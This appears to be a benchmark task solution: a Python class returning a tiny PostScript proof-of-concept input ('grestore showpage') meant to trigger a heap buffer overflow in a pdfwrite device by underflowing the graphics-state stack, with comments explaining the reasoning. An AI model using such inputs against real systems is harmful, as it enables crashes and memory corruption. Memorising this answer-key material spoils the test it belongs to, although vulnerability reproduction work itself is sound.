class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description indicates that an attempt to "restore the
        # viewer state" is made without checking the "viewer depth". In PostScript,
        # which is processed by the 'pdfwrite' device, the graphics state is
        # managed on a stack. The `grestore` operator pops a state from this stack.
        #
        # A PostScript interpreter starts with a single state on the stack. Calling
        # `grestore` without a preceding `gsave` (which pushes a state) results in
        # an underflow condition. The vulnerability is that the underlying C code
        # does not handle this error case correctly, leading to a heap buffer overflow.
        #
        # The `showpage` operator is included to ensure that the graphics commands
        # are flushed and processed by the pdfwrite device, which is where the
        # corrupt state is likely to be used, triggering the crash.
        #
        # This minimal PostScript payload directly targets the described flaw.
        return b"grestore showpage"